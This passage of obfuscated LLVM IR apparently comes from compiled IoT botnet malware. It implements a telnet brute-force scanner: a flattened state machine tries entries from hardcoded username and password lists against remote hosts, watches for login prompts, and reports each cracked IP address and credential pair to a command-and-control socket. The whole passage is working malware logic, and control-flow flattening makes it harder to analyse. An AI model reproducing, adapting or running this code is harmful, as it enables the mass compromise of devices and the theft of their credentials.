  %368 = select i1 %367, i32 1573552594, i32 717575377
  store i32 %368, i32* %switchVar
  br label %loopEnd

; <label>:369:                                    ; preds = %loopEntry
  %370 = load i32, i32* %2, align 4
  %371 = sext i32 %370 to i64
  %.reload135 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload135, i64 %371
  %373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %372, i32 0, i32 0
  %374 = load i32, i32* %373, align 16
  %375 = call i32 @sclose(i32 %374)
  %376 = load i32, i32* %2, align 4
  %377 = sext i32 %376 to i64
  %.reload134 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload134, i64 %377
  %379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %378, i32 0, i32 2
  store i8 0, i8* %379, align 8
  %380 = load i32, i32* %2, align 4
  %381 = sext i32 %380 to i64
  %.reload133 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload133, i64 %381
  %383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %382, i32 0, i32 3
  store i8 1, i8* %383, align 1
  store i32 717575377, i32* %switchVar
  br label %loopEnd

; <label>:384:                                    ; preds = %loopEntry
  store i32 -1818707963, i32* %switchVar
  br label %loopEnd

; <label>:385:                                    ; preds = %loopEntry
  %386 = load i32, i32* %2, align 4
  %387 = sext i32 %386 to i64
  %.reload132 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload132, i64 %387
  %389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %388, i32 0, i32 6
  %390 = load i32, i32* %389, align 4
  %391 = add i32 %390, 5
  %392 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %393 = icmp ult i32 %391, %392
  %394 = select i1 %393, i32 457003979, i32 376214968
  store i32 %394, i32* %switchVar
  br label %loopEnd

; <label>:395:                                    ; preds = %loopEntry
  %396 = load i32, i32* %2, align 4
  %397 = sext i32 %396 to i64
  %.reload131 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload131, i64 %397
  %399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %398, i32 0, i32 0
  %400 = load i32, i32* %399, align 16
  %401 = call i32 @sclose(i32 %400)
  %402 = load i32, i32* %2, align 4
  %403 = sext i32 %402 to i64
  %.reload130 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload130, i64 %403
  %405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %404, i32 0, i32 2
  store i8 0, i8* %405, align 8
  %406 = load i32, i32* %2, align 4
  %407 = sext i32 %406 to i64
  %.reload129 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload129, i64 %407
  %409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %408, i32 0, i32 3
  store i8 1, i8* %409, align 1
  store i32 376214968, i32* %switchVar
  br label %loopEnd

; <label>:410:                                    ; preds = %loopEntry
  store i32 1729329605, i32* %switchVar
  br label %loopEnd

; <label>:411:                                    ; preds = %loopEntry
  %412 = load i32, i32* %2, align 4
  %413 = sext i32 %412 to i64
  %.reload128 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload128, i64 %413
  %415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %414, i32 0, i32 6
  %416 = load i32, i32* %415, align 4
  %417 = icmp eq i32 %416, 0
  %418 = select i1 %417, i32 -32227355, i32 -676689760
  store i32 %418, i32* %switchVar
  br label %loopEnd

; <label>:419:                                    ; preds = %loopEntry
  %420 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %421 = load i32, i32* %2, align 4
  %422 = sext i32 %421 to i64
  %.reload127 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %423 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload127, i64 %422
  %424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %423, i32 0, i32 6
  store i32 %420, i32* %424, align 4
  store i32 -676689760, i32* %switchVar
  br label %loopEnd

; <label>:425:                                    ; preds = %loopEntry
  %426 = load i32, i32* %2, align 4
  %427 = sext i32 %426 to i64
  %.reload126 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %428 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload126, i64 %427
  %429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %428, i32 0, i32 8
  %430 = load i8*, i8** %429, align 8
  %431 = call i32 @matchPrompt(i8* %430)
  %432 = icmp ne i32 %431, 0
  %433 = select i1 %432, i32 -874048147, i32 576628395
  store i32 %433, i32* %switchVar
  br label %loopEnd

; <label>:434:                                    ; preds = %loopEntry
  %435 = load i32, i32* %2, align 4
  %436 = sext i32 %435 to i64
  %.reload125 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload125, i64 %436
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %437, i32 0, i32 2
  store i8 7, i8* %438, align 8
  store i32 576628395, i32* %switchVar
  br label %loopEnd

; <label>:439:                                    ; preds = %loopEntry
  %440 = load i32, i32* %2, align 4
  %441 = sext i32 %440 to i64
  %.reload124 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload124, i64 %441
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %442, i32 0, i32 0
  %444 = load i32, i32* %443, align 16
  %445 = load i32, i32* %2, align 4
  %446 = sext i32 %445 to i64
  %.reload123 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload123, i64 %446
  %448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %447, i32 0, i32 8
  %449 = load i8*, i8** %448, align 8
  %450 = load i32, i32* %2, align 4
  %451 = sext i32 %450 to i64
  %.reload122 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload122, i64 %451
  %453 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %452, i32 0, i32 7
  %454 = load i16, i16* %453, align 16
  %455 = zext i16 %454 to i32
  %456 = call i32 @readUntil(i32 %444, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.75, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %449, i32 1024, i32 %455)
  %457 = icmp ne i32 %456, 0
  %458 = select i1 %457, i32 -199589089, i32 -113002571
  store i32 %458, i32* %switchVar
  br label %loopEnd

; <label>:459:                                    ; preds = %loopEntry
  %460 = load i32, i32* %2, align 4
  %461 = sext i32 %460 to i64
  %.reload121 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload121, i64 %461
  %463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %462, i32 0, i32 6
  store i32 0, i32* %463, align 4
  %464 = load i32, i32* %2, align 4
  %465 = sext i32 %464 to i64
  %.reload120 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload120, i64 %465
  %467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %466, i32 0, i32 7
  store i16 0, i16* %467, align 16
  %468 = load i32, i32* %2, align 4
  %469 = sext i32 %468 to i64
  %.reload119 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload119, i64 %469
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %470, i32 0, i32 8
  %472 = load i8*, i8** %471, align 8
  call void @llvm.memset.p0i8.i64(i8* %472, i8 0, i64 1024, i32 1, i1 false)
  %473 = load i32, i32* %2, align 4
  %474 = sext i32 %473 to i64
  %.reload118 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload118, i64 %474
  %476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %475, i32 0, i32 2
  store i8 3, i8* %476, align 8
  store i32 794347618, i32* %switchVar
  br label %loopEnd

; <label>:477:                                    ; preds = %loopEntry
  %478 = load i32, i32* %2, align 4
  %479 = sext i32 %478 to i64
  %.reload117 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload117, i64 %479
  %481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %480, i32 0, i32 8
  %482 = load i8*, i8** %481, align 8
  %483 = call i64 @strlen(i8* %482) #10
  %484 = trunc i64 %483 to i16
  %485 = load i32, i32* %2, align 4
  %486 = sext i32 %485 to i64
  %.reload116 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload116, i64 %486
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %487, i32 0, i32 7
  store i16 %484, i16* %488, align 16
  store i32 1055779424, i32* %switchVar
  br label %loopEnd

; <label>:489:                                    ; preds = %loopEntry
  %490 = load i32, i32* %2, align 4
  %491 = sext i32 %490 to i64
  %.reload115 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload115, i64 %491
  %493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %492, i32 0, i32 6
  %494 = load i32, i32* %493, align 4
  %495 = add i32 %494, 30
  %496 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %497 = icmp ult i32 %495, %496
  %498 = select i1 %497, i32 1369927251, i32 -987137798
  store i32 %498, i32* %switchVar
  br label %loopEnd

; <label>:499:                                    ; preds = %loopEntry
  %500 = load i32, i32* %2, align 4
  %501 = sext i32 %500 to i64
  %.reload114 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload114, i64 %501
  %503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %502, i32 0, i32 0
  %504 = load i32, i32* %503, align 16
  %505 = call i32 @sclose(i32 %504)
  %506 = load i32, i32* %2, align 4
  %507 = sext i32 %506 to i64
  %.reload113 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload113, i64 %507
  %509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %508, i32 0, i32 2
  store i8 0, i8* %509, align 8
  %510 = load i32, i32* %2, align 4
  %511 = sext i32 %510 to i64
  %.reload112 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %512 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload112, i64 %511
  %513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %512, i32 0, i32 3
  store i8 1, i8* %513, align 1
  store i32 -987137798, i32* %switchVar
  br label %loopEnd

; <label>:514:                                    ; preds = %loopEntry
  store i32 1729329605, i32* %switchVar
  br label %loopEnd

; <label>:515:                                    ; preds = %loopEntry
  %516 = load i32, i32* %2, align 4
  %517 = sext i32 %516 to i64
  %.reload111 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload111, i64 %517
  %519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %518, i32 0, i32 0
  %520 = load i32, i32* %519, align 16
  %521 = load i32, i32* %2, align 4
  %522 = sext i32 %521 to i64
  %.reload110 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload110, i64 %522
  %524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %523, i32 0, i32 4
  %525 = load i8, i8* %524, align 2
  %526 = zext i8 %525 to i64
  %527 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %526
  %528 = load i8*, i8** %527, align 8
  %529 = load i32, i32* %2, align 4
  %530 = sext i32 %529 to i64
  %.reload109 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload109, i64 %530
  %532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %531, i32 0, i32 4
  %533 = load i8, i8* %532, align 2
  %534 = zext i8 %533 to i64
  %535 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %534
  %536 = load i8*, i8** %535, align 8
  %537 = call i64 @strlen(i8* %536) #10
  %538 = call i64 @send(i32 %520, i8* %528, i64 %537, i32 16384)
  %539 = icmp slt i64 %538, 0
  %540 = select i1 %539, i32 -1357143724, i32 164530048
  store i32 %540, i32* %switchVar
  br label %loopEnd

; <label>:541:                                    ; preds = %loopEntry
  %542 = load i32, i32* %2, align 4
  %543 = sext i32 %542 to i64
  %.reload108 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload108, i64 %543
  %545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %544, i32 0, i32 0
  %546 = load i32, i32* %545, align 16
  %547 = call i32 @sclose(i32 %546)
  %548 = load i32, i32* %2, align 4
  %549 = sext i32 %548 to i64
  %.reload107 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload107, i64 %549
  %551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %550, i32 0, i32 2
  store i8 0, i8* %551, align 8
  %552 = load i32, i32* %2, align 4
  %553 = sext i32 %552 to i64
  %.reload106 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload106, i64 %553
  %555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %554, i32 0, i32 3
  store i8 1, i8* %555, align 1
  store i32 794347618, i32* %switchVar
  br label %loopEnd

; <label>:556:                                    ; preds = %loopEntry
  %557 = load i32, i32* %2, align 4
  %558 = sext i32 %557 to i64
  %.reload105 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %559 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload105, i64 %558
  %560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %559, i32 0, i32 0
  %561 = load i32, i32* %560, align 16
  %562 = call i64 @send(i32 %561, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i32 0, i32 0), i64 2, i32 16384)
  %563 = icmp slt i64 %562, 0
  %564 = select i1 %563, i32 70113988, i32 -1487877315
  store i32 %564, i32* %switchVar
  br label %loopEnd

; <label>:565:                                    ; preds = %loopEntry
  %566 = load i32, i32* %2, align 4
  %567 = sext i32 %566 to i64
  %.reload104 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload104, i64 %567
  %569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %568, i32 0, i32 0
  %570 = load i32, i32* %569, align 16
  %571 = call i32 @sclose(i32 %570)
  %572 = load i32, i32* %2, align 4
  %573 = sext i32 %572 to i64
  %.reload103 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %574 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload103, i64 %573
  %575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %574, i32 0, i32 2
  store i8 0, i8* %575, align 8
  %576 = load i32, i32* %2, align 4
  %577 = sext i32 %576 to i64
  %.reload102 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload102, i64 %577
  %579 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %578, i32 0, i32 3
  store i8 1, i8* %579, align 1
  store i32 794347618, i32* %switchVar
  br label %loopEnd

; <label>:580:                                    ; preds = %loopEntry
  %581 = load i32, i32* %2, align 4
  %582 = sext i32 %581 to i64
  %.reload101 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload101, i64 %582
  %584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %583, i32 0, i32 2
  store i8 4, i8* %584, align 8
  store i32 1729329605, i32* %switchVar
  br label %loopEnd

; <label>:585:                                    ; preds = %loopEntry
  %586 = load i32, i32* %2, align 4
  %587 = sext i32 %586 to i64
  %.reload100 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload100, i64 %587
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %588, i32 0, i32 6
  %590 = load i32, i32* %589, align 4
  %591 = icmp eq i32 %590, 0
  %592 = select i1 %591, i32 -1216950786, i32 -1681101598
  store i32 %592, i32* %switchVar
  br label %loopEnd

; <label>:593:                                    ; preds = %loopEntry
  %594 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %595 = load i32, i32* %2, align 4
  %596 = sext i32 %595 to i64
  %.reload99 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %597 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload99, i64 %596
  %598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %597, i32 0, i32 6
  store i32 %594, i32* %598, align 4
  store i32 -1681101598, i32* %switchVar
  br label %loopEnd

; <label>:599:                                    ; preds = %loopEntry
  %600 = load i32, i32* %2, align 4
  %601 = sext i32 %600 to i64
  %.reload98 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload98, i64 %601
  %603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %602, i32 0, i32 0
  %604 = load i32, i32* %603, align 16
  %605 = load i32, i32* %2, align 4
  %606 = sext i32 %605 to i64
  %.reload97 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload97, i64 %606
  %608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %607, i32 0, i32 8
  %609 = load i8*, i8** %608, align 8
  %610 = load i32, i32* %2, align 4
  %611 = sext i32 %610 to i64
  %.reload96 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload96, i64 %611
  %613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %612, i32 0, i32 7
  %614 = load i16, i16* %613, align 16
  %615 = zext i16 %614 to i32
  %616 = call i32 @readUntil(i32 %604, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.76, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %609, i32 1024, i32 %615)
  %617 = icmp ne i32 %616, 0
  %618 = select i1 %617, i32 -1220786600, i32 12893266
  store i32 %618, i32* %switchVar
  br label %loopEnd

; <label>:619:                                    ; preds = %loopEntry
  %620 = load i32, i32* @mainCommSock, align 4
  %621 = load i32, i32* %2, align 4
  %622 = sext i32 %621 to i64
  %.reload95 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload95, i64 %622
  %624 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %623, i32 0, i32 1
  %625 = bitcast i32* %624 to %struct.in_addr*
  %626 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %625, i32 0, i32 0
  %627 = load i32, i32* %626, align 4
  %628 = call i8* @inet_ntoa(i32 %627) #2
  %629 = load i32, i32* %2, align 4
  %630 = sext i32 %629 to i64
  %.reload94 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload94, i64 %630
  %632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %631, i32 0, i32 4
  %633 = load i8, i8* %632, align 2
  %634 = zext i8 %633 to i64
  %635 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %634
  %636 = load i8*, i8** %635, align 8
  %637 = load i32, i32* %2, align 4
  %638 = sext i32 %637 to i64
  %.reload93 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload93, i64 %638
  %640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %639, i32 0, i32 5
  %641 = load i8, i8* %640, align 1
  %642 = zext i8 %641 to i64
  %643 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %642
  %644 = load i8*, i8** %643, align 8
  %645 = call i32 (i32, i8*, ...) @sockprintf(i32 %620, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.77, i32 0, i32 0), i8* %628, i8* %636, i8* %644)
  %646 = load i32, i32* %2, align 4
  %647 = sext i32 %646 to i64
  %.reload92 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload92, i64 %647
  %649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %648, i32 0, i32 6
  store i32 0, i32* %649, align 4
  %650 = load i32, i32* %2, align 4
  %651 = sext i32 %650 to i64
  %.reload91 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload91, i64 %651
  %653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %652, i32 0, i32 7
  store i16 0, i16* %653, align 16
  %654 = load i32, i32* %2, align 4
  %655 = sext i32 %654 to i64
  %.reload90 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload90, i64 %655
  %657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %656, i32 0, i32 8
  %658 = load i8*, i8** %657, align 8
  %659 = call i8* @strstr(i8* %658, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.76, i32 0, i32 0)) #10
  %660 = icmp ne i8* %659, null
  %661 = select i1 %660, i32 -1649252881, i32 1910311141
  store i32 %661, i32* %switchVar
  br label %loopEnd

; <label>:662:                                    ; preds = %loopEntry
  %663 = load i32, i32* %2, align 4
  %664 = sext i32 %663 to i64
  %.reload89 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload89, i64 %664
  %666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %665, i32 0, i32 2
  store i8 5, i8* %666, align 8
  store i32 -967861305, i32* %switchVar
  br label %loopEnd

; <label>:667:                                    ; preds = %loopEntry
  %668 = load i32, i32* %2, align 4
  %669 = sext i32 %668 to i64
  %.reload88 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload88, i64 %669
  %671 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %670, i32 0, i32 2
  store i8 7, i8* %671, align 8
  store i32 -967861305, i32* %switchVar
  br label %loopEnd

; <label>:672:                                    ; preds = %loopEntry
  %673 = load i32, i32* %2, align 4
  %674 = sext i32 %673 to i64
  %.reload87 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %675 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload87, i64 %674
  %676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %675, i32 0, i32 8
  %677 = load i8*, i8** %676, align 8
  call void @llvm.memset.p0i8.i64(i8* %677, i8 0, i64 1024, i32 1, i1 false)
  store i32 794347618, i32* %switchVar
  br label %loopEnd

; <label>:678:                                    ; preds = %loopEntry
  %679 = load i32, i32* %2, align 4
  %680 = sext i32 %679 to i64
  %.reload86 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %681 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload86, i64 %680
  %682 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %681, i32 0, i32 8
  %683 = load i8*, i8** %682, align 8
  %684 = call i8* @strstr(i8* %683, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.78, i32 0, i32 0)) #10
  %685 = icmp ne i8* %684, null
  %686 = select i1 %685, i32 578305680, i32 2021749991
  store i32 %686, i32* %switchVar
  br label %loopEnd

; <label>:687:                                    ; preds = %loopEntry
  %688 = load i32, i32* %2, align 4
  %689 = sext i32 %688 to i64
  %.reload85 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload85, i64 %689
  %691 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %690, i32 0, i32 0
  %692 = load i32, i32* %691, align 16
  %693 = call i32 @sclose(i32 %692)
  %694 = load i32, i32* %2, align 4
  %695 = sext i32 %694 to i64
  %.reload84 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload84, i64 %695
  %697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %696, i32 0, i32 2
  store i8 0, i8* %697, align 8
  %698 = load i32, i32* %2, align 4
  %699 = sext i32 %698 to i64
  %.reload83 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %700 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload83, i64 %699
  %701 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %700, i32 0, i32 3
  store i8 0, i8* %701, align 1
  store i32 794347618, i32* %switchVar
  br label %loopEnd

; <label>:702:                                    ; preds = %loopEntry
  %703 = load i32, i32* %2, align 4
  %704 = sext i32 %703 to i64
  %.reload82 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %705 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload82, i64 %704
  %706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %705, i32 0, i32 8
  %707 = load i8*, i8** %706, align 8
  %708 = call i64 @strlen(i8* %707) #10
  %709 = trunc i64 %708 to i16
  %710 = load i32, i32* %2, align 4
  %711 = sext i32 %710 to i64
  %.reload81 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %712 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload81, i64 %711
  %713 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %712, i32 0, i32 7
  store i16 %709, i16* %713, align 16
  store i32 -607143118, i32* %switchVar
  br label %loopEnd

; <label>:714:                                    ; preds = %loopEntry
  %715 = load i32, i32* %2, align 4
  %716 = sext i32 %715 to i64
  %.reload80 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload80, i64 %716
  %718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %717, i32 0, i32 6
  %719 = load i32, i32* %718, align 4
  %720 = add i32 %719, 8
  %721 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %722 = icmp ult i32 %720, %721
  %723 = select i1 %722, i32 -1775708556, i32 244697961
  store i32 %723, i32* %switchVar
  br label %loopEnd

; <label>:724:                                    ; preds = %loopEntry
  %725 = load i32, i32* %2, align 4
  %726 = sext i32 %725 to i64
  %.reload79 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %727 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload79, i64 %726
  %728 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %727, i32 0, i32 0
  %729 = load i32, i32* %728, align 16
  %730 = call i32 @sclose(i32 %729)
  %731 = load i32, i32* %2, align 4
  %732 = sext i32 %731 to i64
  %.reload78 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload78, i64 %732
  %734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %733, i32 0, i32 2
  store i8 0, i8* %734, align 8
  %735 = load i32, i32* %2, align 4
  %736 = sext i32 %735 to i64
  %.reload77 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
